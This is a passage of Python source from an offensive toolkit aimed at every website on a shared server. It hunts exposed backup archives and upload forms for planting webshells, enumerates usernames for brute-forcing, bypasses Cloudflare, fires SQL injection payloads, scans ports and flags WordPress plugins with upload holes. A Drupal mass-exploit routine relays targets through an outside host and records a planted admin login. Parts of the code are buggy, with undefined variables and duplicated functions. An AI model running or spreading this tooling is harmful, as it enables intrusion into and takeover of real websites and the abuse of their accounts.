                   'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
        clearScr()
        print("[~] Finding zip file")
        for site in self.sites:
            for zip1 in zipList:
                try:
                    if urllib.request.urlopen(site + zip1).getcode() == 200:
                        print(" [*] Found zip file -> ", site + zip1)
                except IOError:
                    pass

    def findUp(self):
        """
        find upload forms from grabbed
        websites the attacker may succeed to
        upload malicious files like webshells
        """
        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
                  'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
        clearScr()
        print("[~] Finding Upload")
        for site in self.sites:
            for up in upList:
                try:
                    if (urllib.request.urlopen(site + up).getcode() == 200):
                        html = urllib.request.urlopen(site + up).readlines()
                        for line in html:
                            if re.findall('type=file', line):
                                print(" [*] Found upload -> ", site + up)
                except IOError:
                    pass

    def getUsers(self):
        """
        get server users using a method found by
        iranian hackers , the attacker may
        do a bruteforce attack on CPanel, ssh, ftp or
        even mysql if it supports remote login
        (you can use medusa or hydra)
        """
        clearScr()
        print("[~] Grabbing Users")
        userslist = []
        for site1 in self.sites:
            try:
                site = site1
                site = site.replace('http://www.', '')
                site = site.replace('http://', '')
                site = site.replace('.', '')
                if '-' in site:
                    site = site.replace('-', '')
                site = site.replace('/', '')
                while len(site) > 2:
                    resp = urllib.request.urlopen(
                        site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                    if 'invalid username' not in resp.lower():
                        print('\t [*] Found -> ', site)
                        userslist.append(site)
                        break
                    else:
                        print(site)

                    site = site[:-1]
            except:
                pass

        clearScr()
        for user in userslist:
            print(user)

    def cloudflareBypasser(self):
        """
        trys to bypass cloudflare i already wrote
        in my blog how it works, i learned this
        method from a guy in madleets
        """
        clearScr()
        print("[~] Bypassing cloudflare")
        subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
        for site in self.sites:
            site.replace('http://', '')
            site.replace('/', '')
            try:
                ip = socket.gethostbyname(site)
            except socket.error:
                pass
            for sub in subdoms:
                doo = sub + '.' + site
                print(' [~] Trying -> ', doo)
                try:
                    ddd = socket.gethostbyname(doo)
                    if ddd != ip:
                        print(' [*] Cloudflare bypassed -> ', ddd)
                        break
                except socket.error:
                    pass

    def getServerBanner(self):
        """
        simply gets the server banner
        the attacker may benefit from it
        like getting the server side software
        """
        clearScr()
        try:
            s = 'http://' + self.serverip
            httpresponse = urllib.request.urlopen(s)
            print(' [*] Server header -> ',
                  httpresponse.headers.getheader('server'))
        except:
            pass

    def grabSqli(self):
        """
        just grabs all websites in server with php?id= dork
        for scanning for error based sql injection
        """
        page = 1
        lista = []
        while page <= 101:
            try:
                bing = "http://www.bing.com/search?q=ip%3A" + \
                    self.serverip + "+php?id=&count=50&first=" + str(page)
                openbing = urllib.request.urlopen(bing)
                readbing = openbing.read()
                findwebs = re.findall('<h2><a href="(.*?)"', readbing)
                for i in range(len(findwebs)):
                    x = findwebs[i]
                    lista.append(x)
            except:
                pass
            page += 50
        lista = unique(lista)
        self.checkSqli(lista)

    def checkSqli(self, s):
        """
        checks for error based sql injection,
        most of the codes here are from webpwn3r
        project the one who has found an lfi in
        yahoo as i remember, you can find a separate
        tool in my blog
        """
        clearScr()
        print("[~] Checking SQL injection")
        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
                    "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
        check = re.compile(
            "Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
        for url in s:
            try:
                for param in url.split('?')[1].split('&'):
                    for payload in payloads:
                        power = url.replace(param, param + payload.strip())

                        html = urllib.request.urlopen(power).readlines()
                        for line in html:
                            checker = re.findall(check, line)
                            if len(checker) != 0:
                                print(' [*] SQLi found -> ', power)
            except:
                pass


def portScanner(self, mode, ran):
    """
    simple port scanner works with range of ports
    or with common ports (al-swisre idea)
    """
    clearScr()
    print("[~] Scanning Ports")

    def do_it(ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock = sock.connect_ex((ip, port))
        if sock == 0:
            print(" [*] Port %i is open" % port)

    if mode == 1:
        a = ran.split('-')
        start = int(a[0])
        end = int(a[1])
        for i in range(start, end):
            do_it(self.serverip, i)
    elif mode == 2:
        for port in [80, 21, 22, 2082, 25, 53, 110, 443, 143]:

            do_it(self.serverip, port)


############################
minu = '''
\t 1: Drupal Bing Exploiter
\t 2: Get Drupal Websites
\t 3: Drupal Mass Exploiter
\t 99: Back To Main Menu
'''


def drupal():
    '''Drupal Exploit Binger All Websites Of server '''
    ip = input('1- IP : ')
    page = 1
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
            str(page)
        req = urllib.request.Request(url)
        opreq = urllib.request.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            try:

                urlpa = urlparse(url)
                site = urlpa.netloc

                print("[+] Testing At " + site)
                resp = urllib.request.urlopen(
                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
                read = resp.read()
                if "User : HolaKo" in read:
                    print("Exploit found =>" + site)

                    print("user:HolaKo\npass:admin")
                    a = open('up.txt', 'a')
                    a.write(site + '\n')
                    a.write("user:" + user + "\npass:" + pwd + "\n")
                else:
                    print("[-] Expl Not Found :( ")

            except Exception as ex:
                print(ex)
                sys.exit(0)

        # Drupal Server ExtraCtor


def getdrupal():
    ip = input('Enter The Ip ->  ')
    page = 1
    sites = list()
    while page <= 50:

        url = "http://www.bing.com/search?q=ip%3A" + ip + \
            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
        req = urllib.request.Request(url)
        opreq = urllib.request.urlopen(req).read()
        findurl = re.findall(
            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
        page += 1

        for url in findurl:
            split = urlparse(url)
            site = split.netloc
            if site not in sites:
                print(site)
                sites.append(site)

        # Drupal Mass List Exploiter


def drupallist():
    listop = input("Enter The list Txt -> ")
    fileopen = open(listop, 'r')
    content = fileopen.readlines()
    for i in content:
        url = i.strip()
        try:
            openurl = urllib.request.urlopen(
                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
            readcontent = openurl.read()
            if "Success" in readcontent:
                print("[+]Success =>" + url)
                print("[-]username:HolaKo\n[-]password:admin")
                save = open('drupal.txt', 'a')
                save.write(
                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")

            else:
                print(i + "=> exploit not found ")
        except Exception as ex:
            print(ex)


def maine():

    print(minu)
    choose = input("choose a number -> ")
    while True:

        if choose == "1":
            drupal()
        if choose == "2":
            getdrupal()
        if choose == "3":
            drupallist()
        if choose == "4":
            about()
        if choose == "99":
            menu()
        con = input('Continue [Y/n] -> ')
        if con[0].upper() == 'N':
            exit()
        if con[0].upper() == 'Y':
            maine()


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.error.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_joomla(sites):
    joomla = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'administrator').getcode() == 200:
                joomla.append(site)
        except:
            pass

    return joomla


def wppjmla():

    ipp = input('Enter Target IP -> ')
    sites = bing_all_grabber(str(ipp))
    wordpress = check_wordpress(sites)
    joomla = check_joomla(sites)
    for ss in wordpress:
        print(ss)
    print('[+] Found ! ', len(wordpress), ' Wordpress Websites')
    print('-' * 30 + '\n')
    for ss in joomla:
        print(ss)

    print('[+] Found ! ', len(joomla), ' Joomla Websites')

    print('\n')
# initialise the tnscan function


class tnn():
    def __init__(self):
        clearScr()
        aaa = input("Target IP -> ")
        TNscan(aaa)
############################


class bcolors:
    HEADER = ''
    OKBLUE = ''
    OKGREEN = ''
    WARNING = ''
    FAIL = ''
    ENDC = ''
    CYAN = ''


class colors():
    PURPLE = ''
    CYAN = ''
    DARKCYAN = ''
    BLUE = ''
    GREEN = ''
    YELLOW = ''
    RED = ''
    BOLD = ''
    ENDC = ''


def grabsqli(ip):
    try:
        print(bcolors.OKBLUE + "Check_Uplaod... ")
        print('\n')

        page = 1
        while page <= 21:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                ip + "+upload&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            sites = findwebs
            for i in sites:
                try:
                    response = urllib.request.urlopen(i).read()
                    checksqli(i)
                except urllib.error.HTTPError as e:
                    str(sites).strip(i)

            page = page + 10
    except:
        pass


def checksqli(sqli):
    responsetwo = urllib.request.urlopen(sqli).read()
    find = re.findall('type="file"', responsetwo)
    if find:
        print((" Found ==> " + sqli))


def sqlscan():
    ip = input('Enter IP -> ')
    grabsqli(ip)


def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]


def bing_all_grabber(s):
    lista = []
    page = 1
    while page <= 101:
        try:
            bing = "http://www.bing.com/search?q=ip%3A" + \
                s + "+&count=50&first=" + str(page)
            openbing = urllib.request.urlopen(bing)
            readbing = openbing.read()
            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
            for i in range(len(findwebs)):
                allnoclean = findwebs[i]
                findall1 = re.findall('http://(.*?)/', allnoclean)
                for idx, item in enumerate(findall1):
                    if 'www' not in item:
                        findall1[idx] = 'http://www.' + item + '/'
                    else:
                        findall1[idx] = 'http://' + item + '/'
                lista.extend(findall1)

            page += 50
        except urllib.error.URLError:
            pass

    final = unique(lista)
    return final


def check_wordpress(sites):
    wp = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-login.php').getcode() == 200:
                wp.append(site)
        except:
            pass

    return wp


def check_wpstorethemeremotefileupload(sites):
    wpstorethemeremotefileupload = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-content/themes/WPStore/upload/index.php').getcode() == 200:
                wpstorethemeremotefileupload.append(site)
        except:
            pass

    return wpstorethemeremotefileupload


def check_wpcontactcreativeform(sites):
    wpcontactcreativeform = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-content/plugins/sexy-contact-form/includes/fileupload/index.php').getcode() == 200:
                wpcontactcreativeform.append(site)
        except:
            pass

    return wpcontactcreativeform


def check_wplazyseoplugin(sites):
    wplazyseoplugin = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-content/plugins/lazy-seo/lazyseo.php').getcode() == 200:
                wplazyseoplugin.append(site)
        except:
            pass

    return wplazyseoplugin


def check_wpeasyupload(sites):
    wpeasyupload = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-content/plugins/easy-comment-uploads/upload-form.php').getcode() == 200:
                wpeasyupload.append(site)
        except:
            pass

    return wpeasyupload


def check_wpsymposium(sites):
    wpsymposium = []
    for site in sites:
        try:
            if urllib.request.urlopen(site + 'wp-symposium/server/file_upload_form.php').getcode() == 200:
                wpsycmium.append(site)
        except:
            pass

    return wpsymposium


def wpminiscanner():
    ip = input('Enter IP -> ')
    sites = bing_all_grabber(str(ip))
    wordpress = check_wordpress(sites)
    wpstorethemeremotefileupload = check_wpstorethemeremotefileupload(sites)
    wpcontactcreativeform = check_wpcontactcreativeform(sites)
    wplazyseoplugin = check_wplazyseoplugin(sites)
    wpeasyupload = check_wpeasyupload(sites)
    wpsymposium = check_wpsymposium(sites)
    for ss in wordpress:
        print(ss)
    print('[*] Found, ', len(wordpress), ' wordpress sites.')
    print('-' * 30 + '\n')
    for ss in wpstorethemeremotefileupload:
        print(ss)
    print('[*] Found, ', len(wpstorethemeremotefileupload),
          ' wp_storethemeremotefileupload exploit.')
    print('-' * 30 + '\n')
    for ss in wpcontactcreativeform:
        print(ss)
    print('[*] Found, ', len(wpcontactcreativeform),
          ' wp_contactcreativeform exploit.')
    print('-' * 30 + '\n')
    for ss in wplazyseoplugin:
        print(ss)
    print('[*] Found, ', len(wplazyseoplugin), ' wp_lazyseoplugin exploit.')
    print('-' * 30 + '\n')
    for ss in wpeasyupload:
        print(ss)
    print('[*] Found, ', len(wpeasyupload), ' wp_easyupload exploit.')
    print('-' * 30 + '\n')
    for ss in wpsymposium:
        print(ss)

    print('[*] Found, ', len(wpsymposium), ' wp_sympsiup exploit.')

    print('\n')
############################


if __name__ == "__main__":
    menu()
